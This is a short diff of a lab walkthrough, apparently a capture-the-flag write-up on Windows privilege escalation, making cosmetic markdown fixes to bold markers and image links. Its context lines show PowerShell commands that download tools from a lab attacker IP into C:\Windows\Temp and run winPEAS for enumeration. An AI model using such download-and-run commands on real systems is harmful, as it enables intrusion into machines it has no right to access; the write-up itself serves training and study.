@@ -98,7 +98,7 @@ cd C:\Windows\Temp powershell "(New-Object System.Net.WebClient).Downloadfile('h
 
 **Further enumerate the machine. What is the name of the abnormal **_**service**_** running?**
 
-****
+
 
 **Check Windows Exploit Suggester**
 
@@ -128,7 +128,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 winPEASx64.exe
 ```
 
-``![](<../../.gitbook/assets/image (25) (1) (1).png>)``
+![](<../../.gitbook/assets/image (25) (1) (1).png>)
 
 <figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
